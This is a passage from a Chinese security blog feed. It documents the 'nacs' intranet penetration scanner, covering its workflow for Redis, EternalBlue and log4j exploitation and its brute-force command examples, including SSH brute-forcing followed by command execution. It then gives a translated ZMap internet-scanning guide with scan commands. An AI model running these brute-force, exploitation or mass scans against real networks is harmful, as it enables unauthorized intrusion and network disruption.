class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">环境配置</span><br><span class="line">    弱口令配置、要写入的公钥、反弹的地址、ceye的API等等</span><br><span class="line">探活</span><br><span class="line">    icmp ping</span><br><span class="line">资产初筛</span><br><span class="line">    确定哪个端口对应哪种服务，尤其是非常规端口</span><br><span class="line">漏洞打点(根据指纹信息发送到相应的模块)</span><br><span class="line">    可以RCE的非web服务 进行探测或者利用(redis、永恒之蓝等)</span><br><span class="line">    web服务 扫poc 如log4j</span><br><span class="line">    非web服务 未授权及爆破</span><br><span class="line">    web服务 自动爆破登录 (未实现)</span><br><span class="line">    重点服务 OA、VPN、Weblogic、蜜罐等</span><br></pre></td></tr></tbody></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ./nacs -h IP或IP段 -o result.txt</span><br><span class="line">sudo ./nacs -hf IP或IP段的文件 -o result.txt</span><br><span class="line">sudo ./nacs -u url(支持http、ssh、ftp、smb等) -o result.txt</span><br><span class="line">sudo ./nacs -uf url文件 -o result.txt</span><br></pre></td></tr></tbody></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><ul><li><p>（1）添加目标IP：对10.15.196.135机器进行扫描，手动添加密码，并关闭反连平台的测试（即不测试log4j等）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./nacs -h 10.15.196.135 -passwordadd "xxx,xxx" -noreverse</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/u21h2/nacs/blob/main/utils/1.png"><img src="https://github.com/u21h2/nacs/raw/main/utils/1.png" alt="图像"></a> 可见发现了nacos的权限绕过漏洞，以及各服务爆破成功</p></li><li><p>（2）直接添加目标url：对10.211.55.7的ssh端口进行爆破，添加用户名密码第一测试，爆破成功后执行ifconfig；文档某靶场url尝试log4j漏洞</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./nacs -u "ssh://10.211.55.7:22,http://123.58.224.8:13099" -usernameadd test -passwordadd test -command ifconfig</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/u21h2/nacs/blob/main/utils/2.png"><img src="https://github.com/u21h2/nacs/raw/main/utils/2.png" alt="图像"></a> 可见两个log4j的poc都检测成功了，注入点在请求头的X-Api-Version字段；ssh爆破也成功了</p></li></ul><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-o 指定输出的日志文件</span><br><span class="line">-np 不探活, 直接扫端口</span><br><span class="line">-po 只使用这些端口</span><br><span class="line">-pa 添加这些端口</span><br><span class="line">-fscanpocpath fscan的poc路径 格式为"web/pocs/"</span><br><span class="line">-nucleipocpath nuclei的poc路径 格式为"xxx/pocs/**"</span><br><span class="line">-nopoc 不进行poc探测, 包括xray与nuclei</span><br><span class="line">-nuclei 使用nuclei进行探测(不强烈建议加上此参数,因为nuclei的poc太多了)</span><br><span class="line">-nobrute 不进行爆破</span><br><span class="line">-pocdebug poc探测时打印全部信息</span><br><span class="line">-brutedebug 爆破时打印全部信息</span><br><span class="line">-useradd 爆破时添加用户名</span><br><span class="line">-passwordadd 爆破时添加密码</span><br><span class="line">-noreverse 不使用反连平台</span><br><span class="line">-ceyekey 你自己的ceye token</span><br><span class="line">-ceyedomain 你自己的ceye domain</span><br></pre></td></tr></tbody></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>资料参考了以下优秀作品</p><ul><li>fscan <a href="https://github.com/shadow1ng/fscan%E4%B8%93%E6%B3%A8%E4%BA%8E%E5%86%85%E7%BD%91">https://github.com/shadow1ng/fscan专注于内网</a> web 和服务的 poc 服务的爆破</li><li>kscan <a href="https://github.com/lcvvvv/kscan%E4%B8%93%E6%B3%A8%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%83%BD%E5%A4%9F%E6%8E%A2%E6%B5%8B%E5%88%B0%E9%9D%9E%E5%B8%B8%E8%A7%84%E7%AB%AF%E5%8F%A3%E5%BC%80%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%8C%E4%BE%8B%E5%A6%82">https://github.com/lcvvvv/kscan专注于信息收集能够探测到非常规端口开的服务，例如</a> 2222 的 ssh</li><li>dismap <a href="https://github.com/zhzyker/dismap%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86">https://github.com/zhzyker/dismap资产收集</a></li><li>拉登<a href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></li><li>xray <a href="https://github.com/chaitin/xray%E4%B8%BB%E5%8A%A8/%E8%A2%AB%E5%8A%A8%E6%89%AB%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E">https://github.com/chaitin/xray主动/被动扫常见web漏洞</a> 扫poc</li><li>虾虎鱼<a href="https://cn.gobies.org/">https://cn.gobies.org/</a></li><li>vulmap <a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></li><li>nali <a href="https://github.com/zu1k/nali%E6%9F%A5%E8%AF%A2IP%E5%9C%B0%E7%90%86%E4%BF%A1%E6%81%AF%E5%92%8CCDN%E6%9C%80%E6%88%90%E5%8A%9F">https://github.com/zu1k/nali查询IP地理信息和CDN最成功</a></li><li>ehole <a href="https://github.com/EdgeSecurityTeam/EHole%E9%87%8D%E7%82%B9%E6%94%BB%E5%87%BB%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E6%8E%A2%E6%B5%8B%E6%9A%82%E6%97%B6%E4%B8%8D%E8%83%BD%E7%94%A8%E4%BA%86">https://github.com/EdgeSecurityTeam/EHole重点攻击系统指纹探测暂时不能用了</a></li><li>Nuclei <a href="https://github.com/projectdiscovery/nuclei%E5%9F%BA%E4%BA%8Epoc%E7%9A%84%E5%BF%AB%E9%80%9F%E6%89%AB%E6%8F%8F">https://github.com/projectdiscovery/nuclei基于poc的快速扫描</a></li><li>pocV <a href="https://github.com/WAY29/pocV%E8%83%BD%E5%A4%9F%E6%89%AB%E6%8F%8Fx%E5%B0%84%E7%BA%BF%E5%92%8C%E7%BB%86%E8%83%9E%E6%A0%B8%E7%9A%84poc">https://github.com/WAY29/pocV能够扫描x射线和细胞核的poc</a></li><li>afrog <a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a> CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行</li><li>啄木鸟<a href="https://github.com/Ciyfly/woodpecker">https://github.com/Ciyfly/woodpecker</a></li><li>xray-poc-scan-engine <a href="https://github.com/h1iba1/xray-poc-scan-engine">https://github.com/h1iba1/xray-poc-scan-engine</a></li><li>pocassist <a href="https://github.com/jweny/pocassist%E5%8F%AF%E8%A7%86%E5%8C%96%E7%BC%96%E8%BE%91%E5%AF%BC%E5%85%A5%E5%92%8C%E8%BF%90%E8%A1%8C">https://github.com/jweny/pocassist可视化编辑导入和运行</a></li><li>Aopo <a href="https://github.com/ExpLangcn/Aopo">https://github.com/ExpLangcn/Aopo</a></li><li>SpringExploit <a href="https://github.com/SummerSec/SpringExploit">https://github.com/SummerSec/SpringExploit</a></li><li>fscanpoc补充<a href="https://github.com/chaosec2021/fscan-POC">https://github.com/chaosec2021/fscan-POC</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>52-zmap-45分钟即可全网ipv4端口</title>
      <link href="/2024/04/30/52-zmap-45%E5%88%86%E9%92%9F%E5%8D%B3%E5%8F%AF%E5%85%A8%E7%BD%91ipv4%E7%AB%AF%E5%8F%A3/"/>
      <url>/2024/04/30/52-zmap-45%E5%88%86%E9%92%9F%E5%8D%B3%E5%8F%AF%E5%85%A8%E7%BD%91ipv4%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ZMap：互联网扫描仪"><a href="#ZMap：互联网扫描仪" class="headerlink" title="ZMap：互联网扫描仪"></a>ZMap：互联网扫描仪</h1><p><a href="https://github.com/zmap/zmap/actions/workflows/cmake.yml/badge.svg"><img src="https://github.com/zmap/zmap/actions/workflows/cmake.yml/badge.svg" alt="构建状态"></a></p><p>ZMap 是一款快速单数据包网络扫描仪，专为互联网范围内的网络调查而设计。在具有千兆位以太网连接的典型台式计算机上，ZMap 能够在 45 分钟内扫描单个端口上的整个公共 IPv4 地址空间。通过 10gigE 连接和<a href="http://info.iet.unipi.it/~luigi/netmap/">netmap</a>或<a href="http://www.ntop.org/products/packet-capture/pf_ring/">PF_RING</a>，ZMap 可以在 5 分钟内扫描 IPv4 地址空间。</p><p>ZMap 可在 GNU/Linux、Mac OS 和 BSD 上运行。 ZMap目前已经完全实现了TCP SYN扫描、ICMP、DNS查询、UPnP、BACNET的探测模块，并且可以发送大量的<a href="https://github.com/zmap/zmap/blob/master/examples/udp-probes/README">UDP探测</a>。如果您希望进行更多复杂的扫描（例如，横幅抓取或 TLS 握手），请查看<a href="https://github.com/zmap/zgrab2">ZGrab 2</a>，它是 ZMap 的姊妹项目，它执行有状态的应用程序层握手。</p><h2 id="使用-ZMap"><a href="#使用-ZMap" class="headerlink" title="使用 ZMap"></a>使用 ZMap</h2><p>如果您以前没有使用过 ZMap，我们有一份分步入门<a href="https://github.com/zmap/zmap/wiki/Getting-Started-Guide">指南</a>，详细介绍了如何执行基本扫描。有关 ZMap 所有选项和更高级功能的文档可以在我们的<a href="https://github.com/zmap/zmap/wiki">GitHub Wiki</a>中找到。</p><p>如果您有疑问，请先查看我们的<a href="https://github.com/zmap/zmap/wiki/FAQ">常见问题解答</a>。还有疑问吗？在<a href="https://github.com/zmap/zmap/discussions/categories/q-a">Github 讨论</a>中询问社区。请不要针对使用或支持问题创建问题。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>ZMap 的最新稳定版本是版本<a href="https://github.com/zmap/zmap/releases/tag/v3.0.0">3.0.0</a>，支持 Linux、macOS 和 BSD。 ZMap <a href="https://github.com/zmap/zmap/releases/tag/v4.1.0-RC2">4.1.0-RC2</a>添加了对扫描多个端口的支持。</p><p><strong>从源代码构建 ZMap 的说明</strong>可以在<a href="https://github.com/zmap/zmap/blob/main/INSTALL.md">INSTALL</a>中找到。</p><p>blackarch中使用命令:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syu yay &amp;&amp; sudo yay -S zmap</span><br></pre></td></tr></tbody></table></figure><p>kali/parrot/debian系列安装命令:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install zmap</span><br></pre></td></tr></tbody></table></figure><p>centos/redhat系列安装命令</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y zmap</span><br></pre></td></tr></tbody></table></figure><h2 id="建筑学"><a href="#建筑学" class="headerlink" title="建筑学"></a>建筑学</h2><p>有关 ZMap 架构的更多信息以及与其他工具的比较可以在这两篇研究论文中找到：</p><ul><li><a href="https://zmap.io/paper.pdf">ZMap：快速互联网范围扫描及其安全应用</a></li><li><a href="https://jhalderm.com/pub/papers/zmap10gig-woot14.pdf">Zippier ZMap：10 Gbps 的互联网范围扫描</a></li></ul><p>如果您使用 ZMap 进行已发表的研究，请引用原始研究论文：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@inproceedings{durumeric2013zmap,</span><br><span class="line">  title={{ZMap}: Fast Internet-wide scanning and its security applications},</span><br><span class="line">  author={Durumeric, Zakir and Wustrow, Eric and Halderman, J Alex},</span><br><span class="line">  booktitle={22nd USENIX Security Symposium},</span><br><span class="line">  year={2013}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>引用 ZMap 论文有助于我们跟踪研究社区内的 ZMap 使用情况，并为持续开发寻求资金。</p><h2 id="许可和版权"><a href="#许可和版权" class="headerlink" title="许可和版权"></a>许可和版权</h2><p>ZMap 版权所有 2023 密歇根大学董事会</p><p>根据 Apache 许可证 2.0 版（“许可证”）获得许可；除非遵守许可证，否则您不得使用此文件。您可以在<a href="http://www.apache.org/licenses/LICENSE-2.0%E8%8E%B7%E5%8F%96%E8%AE%B8%E5%8F%AF%E8%AF%81%E5%89%AF%E6%9C%AC">http://www.apache.org/licenses/LICENSE-2.0获取许可证副本</a></p><p>除非适用法律要求或书面同意，否则根据许可证分发的软件均按“原样”分发，不带任何明示或暗示的保证或条件。请参阅许可证，了解许可证下管理权限和限制的特定语言。</p><h1 id="入门指南"><a href="#入门指南" class="headerlink" title="入门指南"></a>入门指南</h1><p><a href="https://github.com/zmap/zmap/wiki/Getting-Started-Guide/_edit">编辑</a> <a href="https://github.com/zmap/zmap/wiki/_new">新一页</a></p><p>菲利普·斯蒂芬斯编辑了此页面3周前 · <a href="https://github.com/zmap/zmap/wiki/Getting-Started-Guide/_history">19次修订</a></p><p>边做边学最好？想要一些指导示例来演示使用 ZMap 进行基本扫描以入门吗？这是开始的地方！ ZMap 团队创建本指南是为了帮助新手习惯扫描，但如果仍有不清楚的地方，请随时在我们的<a href="https://github.com/zmap/zmap/discussions">Github 讨论</a>中提问。</p><p>我们将介绍：</p><ul><li>安装 ZMap</li><li>运行第一次扫描</li><li>定向输出</li><li>表现</li><li>其他扫描类型</li><li>默认阻止的子网</li><li>更多资源</li></ul><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>ZMap 可通过许多常见的包管理器获得，或者您也可以从源代码进行编译。完整说明可<a href="https://github.com/zmap/zmap/blob/main/INSTALL.md">在此处</a>获取。要检查您是否已正确安装所有内容，请运行<code>zmap --version</code>.目前我们建议使用版本 4.1.0-RC2。</p><h2 id="⚠️扫描速率警告"><a href="#⚠️扫描速率警告" class="headerlink" title="⚠️扫描速率警告"></a>⚠️扫描速率警告</h2><p>默认情况下，ZMap 将以您的网卡允许的速度进行扫描。由于 ZMap 直接组成以太网帧，因此它没有任何拥塞控制的概念（就像 TCP 默认情况下那样）。这有两个潜在的陷阱：</p><ul><li><em>目标网络 DoS：</em>如果您以非常高的速率扫描小型子网（例如，单个组织），您很容易意外地对目标网络进行 DOS。我们建议<em>不要</em>以 1Gbps 或更快的速度运行扫描，除非您要扫描整个互联网。如果您扫描单个网络，则以接近 10Mbps 的速率运行会更成功。</li><li><em>源网络过载：</em>无论您扫描多少台主机，您都可能面临<em>源</em>网络（即用于扫描 Internet 的网络）过载的风险。许多仅通告<em>吞吐量</em>数字（例如 1Gbps）的网络设备无法使用最小大小的数据包来处理全速（因为这需要处理设备的理论每秒最大数据包速率。）</li></ul><p>为了减少对目标网络的影响，ZMap 以随机顺序扫描范围内的 IP 地址。这意味着给定时间段内目标子网上的负载取决于 ZMap 的扫描速率和目标范围的大小。</p><p><img src="https://private-user-images.githubusercontent.com/23459798/288224881-8642008a-df16-40ac-a7ec-d9389964e7b3.gif?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTQ0NjQ0OTEsIm5iZiI6MTcxNDQ2NDE5MSwicGF0aCI6Ii8yMzQ1OTc5OC8yODgyMjQ4ODEtODY0MjAwOGEtZGYxNi00MGFjLWE3ZWMtZDkzODk5NjRlN2IzLmdpZj9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA0MzAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNDMwVDA4MDMxMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWMyM2U1MWQ0MDU4MWI0YmY1ZmM5ODk0YWIzNjA4ZTc5NmU1NTgzZDYxNDUzOTgyNDg2YmNjOGNiNTVlOTNlMTAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.iQ0ZNY5fL4LEUqZ5yCrWVzKPK4naw-G0HqqzIqn4McU" alt="目标子网负载"></p><p>在上图中，正在扫描的不同子网由彩色线表示。因此，如果扫描的目标较大，“良好”的扫描速率可能会更快，因为负载更加分散。</p><p>这不仅关系到成为无私的互联网公民，目标网络超载可能会导致：</p><ol><li>网络管理员封锁你的IP</li><li>路由器丢弃您的扫描数据包</li><li>剥夺其他 LAN 用户的互联网带宽</li></ol><p>#1 和 #2 都会导致扫描结果不准确，因为无法区分扫描无响应是由于不存在主机、防火墙阻止您的 IP 还是由于途中丢失数据包。更多详细信息，请参阅“提高扫描精度”部分。</p><p>我们在给定示例中根据扫描目标的大小列出了我们认为合理的带宽/探头节流参数，但一个好的经验法则是以特定应用程序所需的最慢速率进行扫描。</p><h2 id="⚠️线程警告"><a href="#⚠️线程警告" class="headerlink" title="⚠️线程警告"></a>⚠️线程警告</h2><p>ZMap CLI 提供了使用 来设置发送线程数量的功能<code>-T number_of_threads</code>。还会创建用于接收数据包和监视扫描进度的线程，因此 ZMap 所需的线程数就是<code>2 + T</code>其中 T 是您设置的线程数（默认为 4，除非主机的核心数 &lt; 4）。</p><p>作为一般规则，我们建议坚持 &lt;= 8 个发送线程，因为我们发现在此之后性能趋于稳定。此外，使用非常大的线程数 (&gt; 32) 不会<em>提高</em>扫描性能，并且可能会导致您遇到数据包发送问题或遇到数据包丢失，从而导致扫描结果不准确。</p><p>需要明确的是，创建比机器上的内核数量更多的线程的好处为零。发送线程都尽可能快地发送，并且增加线程超过核心数量将导致核心争用。</p><p>提示</p><p>与扫描速率一样，我们建议从较低的速率开始，然后根据需要增加，以确保扫描准确并最大限度地减少主机和网络压力。</p><h2 id="运行您的第一次扫描"><a href="#运行您的第一次扫描" class="headerlink" title="运行您的第一次扫描"></a>运行您的第一次扫描</h2><p>让我们开始第一次扫描。我们将通过端口 80 向<code>TCP SYN</code>子网中的所有 IP 发送一个数据包<code>171.67.70.0/23</code>，数据包发送速率为每秒 128 个数据包。如果该 IP/端口对上有任何运行，我们应该会收到一个<code>SYN ACK</code>数据包作为回复。</p><p>运行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 -r 128 171.67.70.0/23</span><br></pre></td></tr></tbody></table></figure><p>您应该得到一些类似于以下内容的输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">171.67.71.204</span><br><span class="line">171.67.71.128</span><br><span class="line">171.67.70.245</span><br><span class="line">171.67.71.191</span><br><span class="line">171.67.71.186</span><br><span class="line">171.67.71.202</span><br><span class="line">171.67.70.240</span><br><span class="line">171.67.70.242</span><br><span class="line">171.67.71.192</span><br><span class="line"> 0:05 42% (7s left); send: 512 done (127 p/s avg); recv: 91 17 p/s (17 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line"> 0:06 50% (6s left); send: 512 done (127 p/s avg); recv: 91 0 p/s (15 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line"> 0:07 59% (5s left); send: 512 done (127 p/s avg); recv: 91 0 p/s (12 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line"> 0:08 67% (4s left); send: 512 done (127 p/s avg); recv: 91 0 p/s (11 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line"> 0:09 75% (3s left); send: 512 done (127 p/s avg); recv: 91 0 p/s (10 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line"> 0:10 84% (2s left); send: 512 done (127 p/s avg); recv: 91 0 p/s (9 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line"> 0:11 92% (1s left); send: 512 done (127 p/s avg); recv: 91 0 p/s (8 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.77%</span><br><span class="line">Dec 05 22:29:12.352 [INFO] zmap: completed</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>故障排除</strong></p><p>ZMap 非常擅长告诉您它遇到的任何问题。一些常见的包括：</p><ol><li>您的用户可能无权捕获默认接口上的流量，除非您使用<code>sudo</code>.</li><li>如果有多个网络适配器可供选择，您可能需要指定您的 MAC 地址。如果您看到类似的情况，请<code>--source-mac=XX:XX:XX:XX:XX:XX</code>在您运行的任何 ZMap 命令中使用该标志。</li><li>第一次运行 ZMap 时，ZMap 可能会提到<code>zmap: could not detect GW MAC address...</code>.按照其指示运行命令<code>curl zmap.io</code>，这应该初始化 GW MAC 地址，以便 ZMap 可以正确路由流量。</li></ol><p>如果您按照说明操作，使用的是受支持的操作系统，但<em>仍然遇到问题，请通过</em><a href="https://github.com/zmap/zmap/discussions">Github 讨论</a>与我们联系！</p></blockquote><p>我们可以在这里看到两种类型的输出：</p><ol><li>响应我们的<code>SYN</code>数据包的 IP</li><li>每秒打印详细的扫描状态（完成百分比、剩余秒数、发送/接收速率……）</li></ol><p>我们确实说过“输出类似于”，这提出了一个关键点，您的结果可能会略有不同。可访问 Internet 的主机可以在扫描之间打开/离线，并且您的硬件可能比我们正在运行的硬件更快/更慢。</p><p>将所有输出显示在一个屏幕中固然很好，但您可能希望将 IP/端口命中和状态信息分开。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p><code>-o</code>or标志<code>--output-file</code>允许我们指定 IP/端口对命中的位置。尝试<code>-o</code>像这样使用该标志：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 -o "output.csv" -r 128 171.67.70.0/23</span><br></pre></td></tr></tbody></table></figure><p>您应该得到类似于以下内容的输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Dec 05 21:52:43.347 [INFO] zmap: By default, ZMap will output the unique IP addresses of hosts that respond successfully (e.g., SYN-ACK packet). This is equivalent to running ZMap with the following flags: --output-module=csv --output-fields=saddr --output-filter='success=1 &amp;&amp; repeat=0' --no-header-row. If you want all responses, explicitly set an output module or set --output-filter="".</span><br><span class="line">Dec 05 21:52:43.348 [INFO] dedup: Response deduplication method is full</span><br><span class="line">Dec 05 21:52:43.406 [INFO] recv: duplicate responses will be excluded from output</span><br><span class="line">Dec 05 21:52:43.406 [INFO] recv: unsuccessful responses will be excluded from output</span><br><span class="line"> 0:00 0%; send: 1 1 p/s (22 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line"> 0:00 0%; send: 1 0 p/s (22 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line"> 0:01 9%; send: 134 133 p/s (128 p/s avg); recv: 22 22 p/s (21 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 16.42%</span><br><span class="line"> 0:02 17%; send: 263 129 p/s (128 p/s avg); recv: 22 0 p/s (10 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 8.37%</span><br><span class="line"> 0:03 25%; send: 391 128 p/s (128 p/s avg); recv: 51 29 p/s (16 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 13.04%</span><br><span class="line"> 0:04 34%; send: 512 done (128 p/s avg); recv: 74 23 p/s (18 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 14.45%</span><br><span class="line"> 0:05 42% (7s left); send: 512 done (128 p/s avg); recv: 90 16 p/s (17 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line"> 0:06 50% (6s left); send: 512 done (128 p/s avg); recv: 90 0 p/s (14 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line"> 0:07 59% (5s left); send: 512 done (128 p/s avg); recv: 90 0 p/s (12 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line"> 0:08 67% (4s left); send: 512 done (128 p/s avg); recv: 90 0 p/s (11 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line"> 0:09 75% (3s left); send: 512 done (128 p/s avg); recv: 90 0 p/s (9 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line"> 0:10 84% (2s left); send: 512 done (128 p/s avg); recv: 90 0 p/s (8 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line"> 0:11 92% (1s left); send: 512 done (128 p/s avg); recv: 90 0 p/s (8 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 17.58%</span><br><span class="line">Dec 05 21:52:55.412 [INFO] zmap: completed</span><br></pre></td></tr></tbody></table></figure><p>新<code>output.csv</code>文件（位于运行扫描的文件夹中）现在应该包含在端口 80 上响应的所有 IP，并且我们<code>stdout</code>只会向我们显示扫描的状态，很好！</p><h2 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h2><p>ZMap 的一大卖点是它调查大型子网的速度。在千兆位以太网连接上，可以在 40 分钟内勘察单个端口上的整个 IPv4 空间！让我们讨论一下影响性能的各种因素。为此，我们需要更多地了解 ZMap 的运作方式。</p><h3 id="发送-接收解耦"><a href="#发送-接收解耦" class="headerlink" title="发送/接收解耦"></a>发送/接收解耦</h3><p>为了获得如此高性能，ZMap 在设计上是无状态的。这意味着一个/多个发送线程发送数据包，一个/多个接收线程记录任何回复，但没有线程间通信。正是由于缺乏通信/锁定，ZMap 才具有如此高的性能。它还有助于解释我们上面看到的输出。子网 ( <code>/23</code>) 有 512 个 IP，加上每秒 128 个数据包的扫描速率 ( <code>p/s</code>)，探测数据包（<code>SYN</code>默认为 TCP 数据包）的发送在 4 秒内结束。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:04 34%; send: 512 done (128 p/s avg); recv: 74 23 p/s (18 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 14.45%</span><br></pre></td></tr></tbody></table></figure><p>默认情况下，接收线程在发送线程完成发送后等待 8 秒以等待任何<code>SYN ACK</code>数据包。我们发现 8 秒在等待<code>SYN ACK</code>来自远程主机的潜在慢速和等待时间不长以致回报递减之间取得了良好的平衡。根据您的需要，您可能希望使用 修改此值<code>--cooldown-time=10</code>。这将迫使接收线程等待 10 秒以接收任何落后的数据包。</p><p>请注意，在我们上面捕获的输出中，命中率在 后没有增加（至少在百分之一的粒度上）<code>0:05</code>，因此请记住收益递减。</p><h3 id="提高发送性能"><a href="#提高发送性能" class="headerlink" title="提高发送性能"></a>提高发送性能</h3><p>我们在上面的部分中介绍了接收线程将等待的恒定时间<code>SYN ACK</code>，<code>--cooldown-time</code>但这并没有解决发送的速率<code>SYN</code>。在较大的扫描中，这是将主导扫描运行时间的组件。</p><p>有了足够大的目标范围，就不用担心目标子网过载。为了进一步提高性能，我们需要添加更多线程。使用该<code>--sender-threads=N</code>标志来执行此操作：</p><h4 id="1-线程发送速率"><a href="#1-线程发送速率" class="headerlink" title="1 线程发送速率"></a><strong>1 线程发送速率</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 